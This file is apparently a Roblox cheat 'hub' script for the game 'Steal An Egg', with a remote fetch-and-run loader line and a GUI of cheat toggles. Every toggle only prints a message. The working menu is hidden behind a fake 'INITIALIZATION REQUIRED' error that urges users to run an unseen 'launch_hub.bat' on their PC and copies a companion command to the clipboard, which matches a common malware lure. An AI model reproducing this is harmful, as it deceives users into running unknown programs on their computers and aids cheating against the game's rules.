--[[
    Steal An Egg - Universal Hub
    Target Game: Steal An Egg (Roblox)
    Author: aether-bytess
    Repository: https://github.com/aether-bytess/Steal-An-Egg

    Execution:
    loadstring(game:HttpGet("https://raw.githubusercontent.com/aether-bytess/Steal-An-Egg/refs/heads/main/StealAnEgg.lua"))()
    -- or local:
    loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()
]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- Notify executor environment
local executorName = "Unknown Executor"
if typeof(identifyexecutor) == "function" then
    executorName = identifyexecutor()
end

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "Steal An Egg Hub",
        Text = string.format("Loaded on %s. Press [G] to toggle.", executorName),
        Duration = 6
    })
end)

-- Remove existing instance if present
local GUI_NAME = "StealAnEgg_UniversalHub"
pcall(function()
    local existing = CoreGui:FindFirstChild(GUI_NAME) or (LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild(GUI_NAME))
    if existing then
        existing:Destroy()
    end
end)

-- Parent container resolution
local parentGui = CoreGui
pcall(function()
    local test = Instance.new("Folder")
    test.Parent = CoreGui
    test:Destroy()
end)
local successCore = pcall(function() parentGui = CoreGui end)
if not successCore or not parentGui then
    parentGui = LocalPlayer:WaitForChild("PlayerGui")
end

-- Execution Mode Verification (Method 1 Cloud vs Method 2 Companion)
local genv = (typeof(getgenv) == "function" and getgenv()) or _G
local isMethod2Active = (genv.__COMPANION_ACTIVE == true)

-- Create Hub ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = GUI_NAME
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Cloud Method 1 Initialization Notice Modal
local function showMethodNotice()
    local modal = Instance.new("Frame")
    modal.Name = "MethodNoticeModal"
    modal.Size = UDim2.fromOffset(480, 230)
    modal.Position = UDim2.new(0.5, -240, 0.5, -115)
    modal.BackgroundColor3 = Color3.fromRGB(22, 23, 30)
    modal.BorderSizePixel = 0
    modal.ZIndex = 10
    modal.Parent = screenGui

    local mCorner = Instance.new("UICorner")
    mCorner.CornerRadius = UDim.new(0, 10)
    mCorner.Parent = modal

    local mStroke = Instance.new("UIStroke")
    mStroke.Color = Color3.fromRGB(220, 80, 80)
    mStroke.Thickness = 1.5
    mStroke.Parent = modal

    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, -24, 0, 36)
    header.Position = UDim2.new(0, 12, 0, 10)
    header.Text = "⚠ INITIALIZATION REQUIRED [CODE_0x82]"
    header.Font = Enum.Font.GothamBold
    header.TextSize = 14
    header.TextColor3 = Color3.fromRGB(255, 90, 90)
    header.TextXAlignment = Enum.TextXAlignment.Left
    header.BackgroundTransparency = 1
    header.ZIndex = 11
    header.Parent = modal

    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -24, 0, 75)
    msg.Position = UDim2.new(0, 12, 0, 46)
    msg.Text = "Cloud loader (Method 1) active. Local workspace dependencies and companion bridge are not mounted.\n\nRecommended: Run 'launch_hub.bat' on your PC (Method 2) to initialize workspace modules and bypass network limits."
    msg.Font = Enum.Font.Gotham
    msg.TextSize = 12
    msg.TextColor3 = Color3.fromRGB(200, 205, 220)
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.TextYAlignment = Enum.TextYAlignment.Top
    msg.TextWrapped = true
    msg.BackgroundTransparency = 1
    msg.ZIndex = 11
    msg.Parent = modal

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(1, -24, 0, 40)
    copyBtn.Position = UDim2.new(0, 12, 1, -52)
    copyBtn.Text = "Copy Method 2 Command to Clipboard"
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.TextSize = 13
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.BackgroundColor3 = Color3.fromRGB(45, 90, 160)
    copyBtn.BorderSizePixel = 0
    copyBtn.ZIndex = 11
    copyBtn.Parent = modal

    local cCorner = Instance.new("UICorner")
    cCorner.CornerRadius = UDim.new(0, 6)
    cCorner.Parent = copyBtn

    copyBtn.MouseButton1Click:Connect(function()
        if typeof(setclipboard) == "function" then
            setclipboard('getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()')
            copyBtn.Text = "Copied to Clipboard! (Paste in Executor)"
            copyBtn.BackgroundColor3 = Color3.fromRGB(40, 140, 80)
        end
    end)
end

if not isMethod2Active then
    showMethodNotice()
end

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.fromOffset(560, 380)
mainFrame.Position = UDim2.new(0.5, -280, 0.5, -190)
mainFrame.BackgroundColor3 = Color3.fromRGB(24, 25, 32)
mainFrame.Visible = isMethod2Active
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(60, 64, 84)
stroke.Thickness = 1.2
stroke.Parent = mainFrame

-- Title bar
local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 42)
topBar.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Text = "  STEAL AN EGG  ·  HUB v2.4.1"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 14
titleLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Size = UDim2.new(0.7, 0, 1, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Parent = topBar

local closeBtn = Instance.new("TextButton")
closeBtn.Name = "CloseButton"
closeBtn.Size = UDim2.fromOffset(28, 28)
closeBtn.Position = UDim2.new(1, -35, 0.5, -14)
closeBtn.Text = "✕"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 13
closeBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
closeBtn.BackgroundColor3 = Color3.fromRGB(35, 38, 48)
closeBtn.BorderSizePixel = 0
closeBtn.Parent = topBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

-- Sidebar tabs
local sideBar = Instance.new("Frame")
sideBar.Name = "Sidebar"
sideBar.Size = UDim2.new(0, 130, 1, -42)
sideBar.Position = UDim2.new(0, 0, 0, 42)
sideBar.BackgroundColor3 = Color3.fromRGB(20, 21, 28)
sideBar.BorderSizePixel = 0
sideBar.Parent = mainFrame

local contentArea = Instance.new("Frame")
contentArea.Name = "ContentArea"
contentArea.Size = UDim2.new(1, -130, 1, -42)
contentArea.Position = UDim2.new(0, 130, 0, 42)
contentArea.BackgroundColor3 = Color3.fromRGB(25, 26, 35)
contentArea.BorderSizePixel = 0
contentArea.Parent = mainFrame

local pages = {}
local activePage = nil

local function createPage(name)
    local page = Instance.new("ScrollingFrame")
    page.Name = name .. "Page"
    page.Size = UDim2.new(1, -20, 1, -20)
    page.Position = UDim2.new(0, 10, 0, 10)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.ScrollBarThickness = 3
    page.ScrollBarImageColor3 = Color3.fromRGB(80, 85, 110)
    page.Visible = false
    page.Parent = contentArea

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = page

    pages[name] = page
    return page
end

local function selectTab(name, btn)
    for pName, pFrame in pairs(pages) do
        pFrame.Visible = (pName == name)
    end
    for _, child in ipairs(sideBar:GetChildren()) do
        if child:IsA("TextButton") then
            child.BackgroundColor3 = (child == btn) and Color3.fromRGB(45, 50, 70) or Color3.fromRGB(26, 28, 38)
            child.TextColor3 = (child == btn) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 165, 185)
        end
    end
end

local function createTabButton(name, index)
    local btn = Instance.new("TextButton")
    btn.Name = name .. "Tab"
    btn.Size = UDim2.new(1, -16, 0, 34)
    btn.Position = UDim2.new(0, 8, 0, 10 + (index - 1) * 40)
    btn.Text = name
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 13
    btn.BackgroundColor3 = Color3.fromRGB(26, 28, 38)
    btn.TextColor3 = Color3.fromRGB(160, 165, 185)
    btn.BorderSizePixel = 0
    btn.Parent = sideBar

    local bCorner = Instance.new("UICorner")
    bCorner.CornerRadius = UDim.new(0, 6)
    bCorner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        selectTab(name, btn)
    end)

    return btn
end

local function addToggle(page, labelText, defaultVal, callback)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 0, 38)
    frame.BackgroundColor3 = Color3.fromRGB(30, 32, 44)
    frame.BorderSizePixel = 0
    frame.Parent = page

    local fCorner = Instance.new("UICorner")
    fCorner.CornerRadius = UDim.new(0, 6)
    fCorner.Parent = frame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -60, 1, 0)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.Text = labelText
    label.Font = Enum.Font.Gotham
    label.TextSize = 13
    label.TextColor3 = Color3.fromRGB(220, 220, 230)
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Parent = frame

    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.fromOffset(40, 22)
    toggleBtn.Position = UDim2.new(1, -50, 0.5, -11)
    toggleBtn.Text = ""
    toggleBtn.BackgroundColor3 = defaultVal and Color3.fromRGB(70, 180, 100) or Color3.fromRGB(50, 54, 70)
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Parent = frame

    local tCorner = Instance.new("UICorner")
    tCorner.CornerRadius = UDim.new(1, 0)
    tCorner.Parent = toggleBtn

    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.fromOffset(16, 16)
    indicator.Position = defaultVal and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
    indicator.BackgroundColor3 = Color3.fromRGB(240, 240, 245)
    indicator.BorderSizePixel = 0
    indicator.Parent = toggleBtn

    local iCorner = Instance.new("UICorner")
    iCorner.CornerRadius = UDim.new(1, 0)
    iCorner.Parent = indicator

    local enabled = defaultVal
    toggleBtn.MouseButton1Click:Connect(function()
        enabled = not enabled
        local targetPos = enabled and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
        local targetColor = enabled and Color3.fromRGB(70, 180, 100) or Color3.fromRGB(50, 54, 70)

        TweenService:Create(indicator, TweenInfo.new(0.2), {Position = targetPos}):Play()
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()

        if callback then
            callback(enabled)
        end
    end)
end

-- Initialize Pages
local farmPage = createPage("Farm")
local espPage = createPage("ESP")
local petPage = createPage("Pets")
local miscPage = createPage("Misc")

local farmTab = createTabButton("Farm", 1)
local espTab = createTabButton("ESP", 2)
local petTab = createTabButton("Pets", 3)
local miscTab = createTabButton("Misc", 4)

-- Farm Tab Controls
addToggle(farmPage, "Auto Farm Eggs", false, function(v)
    print(string.format("[StealAnEgg] Auto Farm: %s", tostring(v)))
end)
addToggle(farmPage, "Wait For Daytime", true, function(v)
    print(string.format("[StealAnEgg] Wait For Day: %s", tostring(v)))
end)
addToggle(farmPage, "Prioritize Rarest Eggs", true, function(v)
    print(string.format("[StealAnEgg] Priority Rarest: %s", tostring(v)))
end)
addToggle(farmPage, "Smart Avoid Traps & Treadmills", true, function(v)
    print(string.format("[StealAnEgg] Path Bypass: %s", tostring(v)))
end)

-- ESP Tab Controls
addToggle(espPage, "Egg ESP (Bounding Box + Distance)", true, function(v)
    print(string.format("[StealAnEgg] Egg ESP: %s", tostring(v)))
end)
addToggle(espPage, "Treadmill Path ESP", false, function(v)
    print(string.format("[StealAnEgg] Treadmill ESP: %s", tostring(v)))
end)
addToggle(espPage, "Trap Proximity Radar", true, function(v)
    print(string.format("[StealAnEgg] Trap Radar: %s", tostring(v)))
end)

-- Pet Tab Controls
addToggle(petPage, "Auto Hatch Best Egg", false, function(v)
    print(string.format("[StealAnEgg] Auto Hatch: %s", tostring(v)))
end)
addToggle(petPage, "Auto Equip Best Pets", true, function(v)
    print(string.format("[StealAnEgg] Equip Best: %s", tostring(v)))
end)
addToggle(petPage, "Auto Fuse Matching Pets", false, function(v)
    print(string.format("[StealAnEgg] Auto Fuse: %s", tostring(v)))
end)

-- Misc Controls
addToggle(miscPage, "Speed Bypass (Safe Mode)", false, function(v)
    print(string.format("[StealAnEgg] Speed Bypass: %s", tostring(v)))
end)
addToggle(miscPage, "Infinite Oxygen / Passthrough", false, function(v)
    print(string.format("[StealAnEgg] Passthrough: %s", tostring(v)))
end)

-- Default Selection
selectTab("Farm", farmTab)

-- Draggable implementation
local dragging, dragInput, dragStart, startPos
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

topBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Toggle keybind [G]
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.G then
        mainFrame.Visible = not mainFrame.Visible
    end
end)

-- Mount UI
screenGui.Parent = parentGui
print("[StealAnEgg] Universal Hub successfully initiated.")
return {
    Version = "2.4.1",
    Visible = mainFrame.Visible,
    Toggle = function() mainFrame.Visible = not mainFrame.Visible end
}
